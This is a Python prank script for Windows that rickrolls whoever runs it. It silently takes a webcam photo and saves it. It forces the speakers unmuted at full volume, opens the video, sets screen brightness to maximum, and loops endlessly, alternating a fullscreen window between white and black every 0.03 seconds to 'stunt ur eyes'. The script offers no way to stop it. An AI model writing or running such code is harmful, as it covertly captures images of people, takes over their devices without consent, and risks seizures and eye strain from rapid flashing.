from ctypes import cast, POINTER, windll, Structure, c_long, byref
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import time
import webbrowser
import ctypes
import pygame
import screen_brightness_control as sbc
import os
import cv2

#logging
with open('log.txt', 'w') as f:
    f.write('.LOG\n You get rickrolled!')

#take photos with webcam
camera = cv2.VideoCapture(0)
for i in range(1):
    return_value, image = camera.read()
    cv2.imwrite('opencv'+str(i)+'.png', image)
del(camera)

#Set max volume
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volume.GetMute()
volume.GetMasterVolumeLevel()
volume.GetVolumeRange()
volume.SetMasterVolumeLevel(0, None)

#Play RickRoll!
webbrowser.open('https://youtu.be/dQw4w9WgXcQ')
time.sleep(1)

#stunt ur eyes
#get screen resolution
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

#set flashing window size
screen = pygame.display.set_mode((w, h))

#max screen brightness
sbc.set_brightness(100)

pygame.display.set_caption('window')
running = True

while True:
  sbc.set_brightness(100)
  volume.SetMute(0, None)
  volume.SetMasterVolumeLevel(0, None)
  background_colour = (255,255,255)
  screen.fill(background_colour)
  time.sleep(0.03)
  background_colour = (0,0,0)
  screen.fill(background_colour)
  time.sleep(0.03)
  
